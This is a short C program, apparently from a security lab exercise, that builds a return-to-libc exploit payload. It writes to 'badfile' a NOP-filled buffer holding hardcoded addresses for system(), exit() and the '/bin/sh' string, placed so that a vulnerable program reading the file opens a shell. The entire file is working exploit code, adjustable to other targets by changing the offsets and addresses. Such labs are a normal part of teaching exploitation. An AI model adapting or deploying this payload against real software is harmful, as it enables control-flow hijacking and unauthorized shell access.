#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int agrc, char **argv)
{
    char buf[40];
    FILE *badfile;
    int X, Y, Z;
    int tmp = 6; // (strlen(./shelladdr) - strlen(./retlib)) * 2

    badfile = fopen("./badfile", "w");
    memset(&buf, 0x90, 40);

    // distance : 0xffffd568 - 0xffffd554 = 20
    X = 32;
    *(long *) &buf[X] = 0xffffdf34 + tmp; // the address of "/bin/sh"
    Y = 24;
    *(long *) &buf[Y] = 0xf7e50950; // the address of system()
    Z = 28;
    *(long *) &buf[Z] = 0xf7e447c0; // the address of exit()

    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);

    return 0;
}